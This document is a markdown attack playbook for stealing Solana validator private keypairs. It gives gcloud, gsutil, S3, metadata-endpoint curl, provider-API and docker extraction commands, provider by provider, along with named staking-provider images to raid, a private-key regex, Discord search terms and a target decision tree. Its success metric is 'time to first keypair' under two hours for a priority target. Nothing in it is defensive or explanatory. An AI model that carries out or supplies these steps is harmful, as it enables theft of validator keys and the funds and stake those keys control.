# KEY ACQUISITION METHODS — BY CLOUD PROVIDER

## GCP (Google Cloud Platform)

### P0: Secret Manager
```bash
# List secrets (if permissions)
gcloud secrets list --filter="name:validator OR name:keypair OR name:identity"

# Access secret version (if permissions)
gcloud secrets versions access latest --secret="validator-keypair"
```

### P1: Cloud Storage (GCS)
```bash
# List buckets
gsutil ls

# Search for keypair files
gsutil ls -r gs://<bucket>/** | grep -E "keypair|identity|vote"

# Download
gsutil cp gs://<bucket>/path/validator-keypair.json .
```

### P2: Compute Engine Metadata
```bash
# From inside VM
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/attributes/

# SSH keys
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys

# Startup script (often contains keypair)
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/attributes/startup-script
```

### P3: Cloud Build / Artifact Registry
```bash
# Build logs may leak keys
gcloud builds log <BUILD_ID>

# Container images
gcloud artifacts docker images list <REGION>-docker.pkg.dev/<PROJECT>/<REPO>
```

---

## DigitalOcean

### P0: Spaces (S3-compatible)
```bash
# List spaces
aws s3 ls --endpoint-url https://nyc3.digitaloceanspaces.com

# Search
aws s3 ls --endpoint-url https://nyc3.digitaloceanspaces.com s3://<space>/ --recursive | grep keypair
```

### P1: Droplet Metadata
```bash
# From inside droplet
curl http://169.254.169.254/metadata/v1.json
curl http://169.254.169.254/metadata/v1/ssh-keys
curl http://169.254.169.254/metadata/v1/user-data
```

### P2: DO API (if token found)
```bash
# List droplets
curl -H "Authorization: Bearer $DO_TOKEN" https://api.digitalocean.com/v2/droplets

# Snapshots/backups
curl -H "Authorization: Bearer $DO_TOKEN" https://api.digitalocean.com/v2/snapshots
```

---

## Choopa / Vultr

### P0: Object Storage
```bash
# S3-compatible
aws s3 ls --endpoint-url https://<region>.vultrobjects.com

# Search
aws s3 ls --endpoint-url https://<region>.vultrobjects.com s3://<bucket>/ --recursive | grep -E "keypair|identity|vote"
```

### P1: Instance Metadata
```bash
# From inside instance
curl http://169.254.169.254/v1/instance/attributes/
curl http://169.254.169.254/v1/instance/ssh-keys
```

### P2: Vultr API
```bash
# List instances
curl -H "API-Key: $VULTR_KEY" https://api.vultr.com/v2/instances

# Snapshots
curl -H "API-Key: $VULTR_KEY" https://api.vultr.com/v2/snapshots
```

---

## Leaseweb

### P0: Object Storage
```bash
aws s3 ls --endpoint-url https://objects.<region>.leaseweb.com
```

### P1: Server Metadata
```bash
curl http://169.254.169.254/metadata/
```

---

## Hetzner

### P0: Storage Box / Robot
```bash
# Storage Box (S3-compatible)
aws s3 ls --endpoint-url https://<username>.your-storagebox.de

# Robot API (server metadata)
curl -u <robot_user>:<robot_pass> https://robot-ws.your-server.de/server/<ip>
```

### P1: Hetzner Cloud API
```bash
# If cloud server
curl -H "Authorization: Bearer $HCLOUD_TOKEN" https://api.hetzner.cloud/v1/servers
```

### P2: Backup Space
```bash
# Often contains server backups with keypairs
aws s3 ls --endpoint-url https://<backup-space>.your-backup.de
```

---

## Docker Hub / Container Registries

### Universal Extraction
```bash
# Pull image
docker pull <image>:<tag>

# Create container (don't run)
docker create --name extract <image>:<tag>

# Extract filesystem
docker cp extract:/root/.config/solana/validator-keypair.json ./validator-keypair.json
docker cp extract:/root/.config/solana/vote-account-keypair.json ./vote-keypair.json
docker cp extract:/opt/solana/validator-keypair.json ./validator-keypair.json
docker cp extract:/etc/solana/validator-keypair.json ./validator-keypair.json

# Cleanup
docker rm extract

# Alternative: save and extract layers
docker save <image>:<tag> -o image.tar
tar -xf image.tar
# Search extracted layers for keypair.json
find . -name "keypair.json" -o -name "identity.json" -o -name "*.json" | xargs grep -l "PRIVATE KEY" 2>/dev/null
```

### Common Image Names to Check
```
solana-validator
solana-validator:v1.18
jito-validator
firedancer
agave-validator
staking-provider/validator
figment/validator
p2p-org/validator
chorus-one/validator
blockdaemon/validator
```

---

## CI/CD Pipeline Leaks

### GitHub Actions
```bash
# Search public workflow runs
# Look for: "solana-keygen", "validator-keypair", "identity-keypair", base58 strings (88 chars)
```

### GitLab CI
```bash
# Public pipelines with solana
# Search .gitlab-ci.yml for "solana-validator"
```

### Build Logs (Universal Patterns)
```
solana-keygen new --outfile
solana-keygen pubkey
validator-keypair.json
identity-keypair.json
vote-account-keypair.json
[1-9A-HJ-NP-Za-km-z]{88}  # base58 private key regex
```

---

## Discord / Telegram OSINT

### Channels to Join
- Solana Validators Discord
- Solana Tech Discord
- Solana Validators (official)
- Figment / P2P / Chorus One / Blockdaemon Discords
- Staking provider Discords

### Search Terms
```
"validator-keypair.json"
"identity keypair"
"vote account keypair"
"lost my keypair"
"backup keypair"
"keypair.json"
[1-9A-HJ-NP-Za-km-z]{88}
```

---

## Acquisition Priority Decision Tree

```
START: Got validator identity + IP + Cloud Provider
  │
  ├─→ GCP?
  │     ├─→ YES: Secret Manager → GCS → Metadata → Build logs
  │     └─→ NO: Next
  │
  ├─→ DigitalOcean?
  │     ├─→ YES: Spaces → Metadata → API (if token)
  │     └─→ NO: Next
  │
  ├─→ Choopa/Vultr?
  │     ├─→ YES: Object Storage → Metadata → API
  │     └─→ NO: Next
  │
  ├─→ Leaseweb?
  │     ├─→ YES: Object Storage → Metadata
  │     └─→ NO: Next
  │
  ├─→ Hetzner?
  │     ├─→ YES: Storage Box → Robot API → Cloud API → Backup Space
  │     └─→ NO: Next
  │
  ├─→ Docker Image Available?
  │     ├─→ YES: Pull → Extract layers → Search filesystem
  │     └─→ NO: Next
  │
  ├─→ CI/CD Public?
  │     ├─→ YES: Search build logs for keypair patterns
  │     └─→ NO: Next
  │
  └─→ Discord/Telegram?
        └─→ YES: Search message history
```

---

## Success Metrics
- **Time to first keypair**: Target < 2 hours for P0 target
- **Validation**: `solana-keygen pubkey keypair.json` → matches identity_pubkey
- **Vote account**: `solana-keygen pubkey vote-keypair.json` → matches vote_pubkey